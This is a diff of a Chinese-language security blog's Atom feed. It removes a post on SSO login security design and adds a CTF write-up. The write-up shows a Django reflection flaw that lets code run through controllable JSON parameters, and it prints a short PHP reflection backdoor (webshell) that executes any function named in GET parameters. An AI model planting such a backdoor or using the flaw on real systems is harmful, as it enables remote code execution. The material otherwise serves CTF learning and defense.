@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-02-03T07:08:32.000Z</updated>
+  <updated>2016-01-29T02:34:13.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,46 +13,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title><![CDATA[SSO统一登录方案的安全设计]]></title>
-    <link href="http://xdxd.love/2016/01/29/SSO%E7%BB%9F%E4%B8%80%E7%99%BB%E5%BD%95%E6%96%B9%E6%A1%88%E7%9A%84%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/"/>
-    <id>http://xdxd.love/2016/01/29/SSO统一登录方案的安全设计/</id>
-    <published>2016-01-29T06:06:03.000Z</published>
-    <updated>2016-02-03T07:08:32.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="保持登录状态">保持登录状态</h1><p><a href="http://xdxd.love/2016/01/07/%E6%97%A0%E7%8A%B6%E6%80%81%E5%8D%8F%E8%AE%AE%E4%B8%AD%E8%AE%A4%E8%AF%81%E7%8A%B6%E6%80%81%E4%BF%9D%E6%8C%81%E6%96%B9%E6%A1%88%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/">无状态协议中认证状态保持方案的一些思考</a>这里对HTTP协议应用中如何保持用户的登录状态做了一些探讨。基本是两个思路一个保存在服务端，一个保存在客户端。</p>
-<p><img src="/images/sso1.png" alt=""></p>
-<p>这些想法来自于对所见过的案例的总结。后来在<a href="https://www.leavesongs.com/PYTHON/rewrite-sec-news.html" target="_blank" rel="external">重构Sec-News之路</a>中发现了client-side-session和server-side-session的概念。原来对于这两种保存登录状态的方式都早就有了比较好的总结。见维基百科<a href="https://en.wikipedia.org/wiki/Session_(computer_science" target="_blank" rel="external">Client_side_web_sessions</a>#Client_side_web_sessions)。client-side-session的优势和弱点也都有比较好的总结。</p>
-<h1 id="自定义术语">自定义术语</h1><p>单点登录SSO（Single Sign On）说得简单点就是在一个多系统共存的环境下，用户在其中一个应用中登录之后，再访问其他应用不再需要重新登录。用户的登录状态可以在所有的应用中共享。</p>
-<p>中心应用： 提供统一登录入口的应用称为中心应用。中心应用也提供很多其他的服务接口，提供登录入口只是其中一个功能。</p>
-<p>子应用： SSO环境中的系统，除了中心应用，其他应用称为子应用。</p>
-<p>先看几个实践中曾使用的架构设计。</p>
-<h1 id="设计方案">设计方案</h1><p>途牛首席架构师博客中对其设计的SSO架构分析</p>
-<p><img src="/images/sso2.png" alt=""></p>
-<p>猎豹移动博客对其SSO架构的分析</p>
-<blockquote>
-<p>共享Cookie，这种是我们最先采取的方式。</p>
-<p>当我们的子系统都在一个父级域名下时，我们可以将Cookie种在父域下，这样浏览器同域名下的Cookie则可以共享，这样可以通过Cookie加解密的算法获取用户SessionID，从而实现SSO。<br>但是，后面我们发现这种方式有几种弊端：<br>a. 所有同域名的系统都能获取SessionID，易被修改且不安全；<br>b. 跨域无法使用。<br>所以到后面抛弃这种做法。</p>
-<p>Ticket验证，我们目前采取的是这种方式。</p>
-<p>这种实现的SSO有以下几个步骤：<br>a. 用户访问某个子系统，发现如果未登录，则引导用户跳转到SSO登录页面；<br>b. 判断SSO是否已经登录；<br>c. 如果已经登录，直接跳转到回调地址，并返回认证ticket；<br>d. 如果未登录，用户正确输入用户名/密码，认证通过跳转到回调地址，并返回认证ticket；<br>e. 子系统获取ticket，调用SSO获取用户uid等信息，成功后让用户登录。</p>
-</blockquote>
-<p><img src="/images/sso3.png" alt=""></p>
-<h1 id="UCenter架构分析">UCenter架构分析</h1><h1 id="设计方案分类">设计方案分类</h1><p>探讨SSO设计方案这个话题的时候，通常会看到多种方案，但鲜有从总结的角度进行分类的思考。曾尝试按照第一次自动登录实现的流程来分类，比如是否需要跳转中心应用来实现自动登录，后来觉得这样分类过于形式。以及维持登录状态的方式是server_side_session还是client_side_session来进行分类。server_side_session和client_side_session是一种可以使用的分类依据，但是这是登录状态维持的不同方式，在单点登录中，除了登录，更重要的是要单点这个特性。</p>
-<p>最后考虑到做这个分析的目的是安全架构和安全审计，所以可以使用SSO各子系统登录状态的隔离作为一个分类依据，来总结和分析各个单点登录方案的安全性。隔离的程度越高，系统越安全。</p>
-<p>在SSO中，这里的隔离主要是两个方面：</p>
-<p>一是子系统之间登录session/cookie的隔离。二是子系统使用的密钥的隔离。比如采用共享主域cookie的方案中，各个子系统cookie是共享的没有隔离，所有具有较大的安全隐患。比如搜狐的cookie，一旦一个子系统出现问题，获取到的cookie就可以控制所有搜狐的业务。参考案例<a href="http://wooyun.org/bugs/wooyun-2013-046327" target="_blank" rel="external">搜狐博客存储型xss1获取cookie可登录邮箱微博等</a></p>
-<h1 id="风险分析模型">风险分析模型</h1><p>对SSO系统进行风险分析可以类比密钥管理的checklish，SSO管理的核心数据是用户登录的session，既登录凭证，从登录凭证的生成，传输，验证，使用，更新，存储，备份，泄露，销毁等阶段来进行风险分析。</p>
-<h1 id="统一登出的问题">统一登出的问题</h1><h1 id="参考资料">参考资料</h1><p><a href="https://www.zhihu.com/question/19779937" target="_blank" rel="external">https://www.zhihu.com/question/19779937</a><br><a href="http://atlantisplus.net/articles/570.html" target="_blank" rel="external">http://atlantisplus.net/articles/570.html</a><br><a href="http://dev.cmcm.com/archives/238" target="_blank" rel="external">http://dev.cmcm.com/archives/238</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h1 id="保持登录状态">保持登录状态</h1><p><a href="http://xdxd.love/2016/01/07/%E6%97%A0%E7%8A%B6%E6%80%81%E5%8D%8F%E8%AE%AE%E4%B8%AD%E8%AE%A4%E8%AF%81%]]>
-    </summary>
-    
-      <category term="SSO" scheme="http://xdxd.love/tags/SSO/"/>
-    
-      <category term="安全设计" scheme="http://xdxd.love/categories/%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/"/>
-    
-  </entry>
   
   <entry>
     <title><![CDATA[sqlalchemy保存字典对象报语法错误]]></title>
@@ -1039,6 +999,42 @@ Welcome!
     <summary type="html">
     
     </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[华山杯CTF做过的几道题]]></title>
+    <link href="http://xdxd.love/2015/11/23/%E5%8D%8E%E5%B1%B1%E6%9D%AFCTF%E5%81%9A%E8%BF%87%E7%9A%84%E5%87%A0%E9%81%93%E9%A2%98/"/>
+    <id>http://xdxd.love/2015/11/23/华山杯CTF做过的几道题/</id>
+    <published>2015-11-23T08:04:35.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>花时间做了几道题，感觉还是有收获的。虽然死亡之ping这些知识点不熟悉，web的python题还是学到了不少知识。</p>
+<p>登录的时候会随机报错。查看返回django的调试模式泄露源码。</p>
+<p><img src="/images/huashanctf1.png" alt=""></p>
+<p>通过改变参数多次尝试报错，可以或得部分代码：</p>
+<pre><code>c = json.loads(request.body)
+<span class="keyword">method</span> = getattr(globals()[c['obj']],c['<span class="keyword">method</span>'])
+ret = <span class="keyword">method</span>(c['params'])
+retdata['<span class="literal">result</span>'],retdata['error'] = ret
+</code></pre><p>通过反射的方式来执行对象的函数，而ojb，method和params三个参数都是可控的，这样就可以导致代码执行。具体可以参考<a href="http://www.secpulse.com/archives/40012.html" target="_blank" rel="external">writeup</a></p>
+<p>python <a href="http://stackoverflow.com/questions/12693606/reason-for-globals-in-python" target="_blank" rel="external">globals()</a>返回一个map，这个map的key是全局范围内对象的名字，value是该对象的实例。</p>
+<p>利用php的反射写的后门如下：</p>
+<pre><code><span class="php"><span class="preprocessor">&lt;?php</span>
+    <span class="variable">$func</span> = <span class="keyword">new</span> ReflectionFunction(<span class="variable">$_GET</span>[m]);
+    <span class="keyword">echo</span> <span class="variable">$func</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="variable">$_GET</span>[c]));
+<span class="preprocessor">?&gt;</span></span>
+</code></pre><p>可以参考<a href="https://github.com/tennc/webshell/tree/master/php/p2j" target="_blank" rel="external">php反射后门</a></p>
+<p>还有做的两个题就是分析流量。感觉还是比较有意思，在网络包种寻找信息，有点侦探的感觉。一个tips就是发现base64编码的密码，使用burpsuite的decode解码base64是乱码，以为不是base64，卡半天想不出来。其实是因为是中文做的base64编码，使用在线的base64解码工具可以直接解出中文。看来以前很多看起来像base64，但是decode是乱码，很可能是因为编码不对啊。<a href="http://sudalover.com/?p=155" target="_blank" rel="external">writeup</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>花时间做了几道题，感觉还是有收获的。虽然死亡之ping这些知识点不熟悉，web的python题还是学到了不少知识。</p>
+<p>登录的时候会随机报错。查看返回django的调试模式泄露源码。</p>
+<p><img src="/images/huashanctf1.png]]>
+    </summary>
+    
+      <category term="ctf" scheme="http://xdxd.love/tags/ctf/"/>
+    
+      <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
